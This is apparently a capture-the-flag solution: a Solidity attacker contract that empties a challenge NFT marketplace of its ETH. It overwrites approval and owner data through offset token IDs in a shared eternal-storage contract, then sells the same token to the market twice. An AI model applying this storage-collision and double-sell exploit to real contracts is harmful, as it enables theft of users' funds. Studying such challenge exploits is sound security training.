pragma solidity 0.7.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract MarketAttacker {
    Setup public setup;
    EternalStorageAPI public eternalStorage;
    CryptoCollectibles public token;
    CryptoCollectiblesMarket public market;

    constructor(Setup _setup) {
        setup = _setup;
        eternalStorage = _setup.eternalStorage();
        token = _setup.token();
        market = _setup.market();
    }

    function attack() external payable {
        console.log("market balance start: %s", address(market).balance);
        // the token price is not the one we send, it's - 10/11 of it
        bytes32 tokenId =
            market.mintCollectibleFor{value: 70 ether}(address(this));

        // need to set approval to market for sellCollectible check
        token.approve(tokenId, address(market));
        // update @tokenId + 3 to "this"
        eternalStorage.updateMetadata(tokenId, address(this));
        console.log("token metadata", eternalStorage.getMetadata(tokenId));

        // sell it to the market
        market.sellCollectible(tokenId);

        reclaimToken(tokenId);

        // we need to completely empty market which is annoying because of fee
        // so we need to send some more funds to the market to be able to withdraw
        // all of it
        fixMarketBalance(70 ether);

        // sell it again!
        market.sellCollectible(tokenId);

        console.log("market balance end: %s", address(market).balance);
        require(setup.isSolved(), "!solved");
    }

    function reclaimToken(bytes32 tokenId) internal {
        // change name of tokenId + 2, i.e., overwrite tokenId's approval. repeat.
        // passes ensureTokenOwner check because (tokenId+2) + 1 = tokenId's metadata
        bytes32 spoofTokenId = bytes32(uint256(tokenId) + 2);
        eternalStorage.updateName(
            spoofTokenId,
            bytes32(uint256(address(this)))
        );
        token.transferFrom(tokenId, address(market), address(this));
        token.approve(tokenId, address(market));
    }

    function fixMarketBalance(uint256 sentAmount) internal {
        // uint256 tokenPrice = market.tokenPrices(tokenId);
        uint256 tokenPrice = (sentAmount * 10000) / (10000 + 1000);
        uint256 missingBalance = tokenPrice - address(market).balance;
        // send missing ETH to market by minting a new token
        market.mintCollectible{value: missingBalance}();
    }

    receive() external payable {}
}
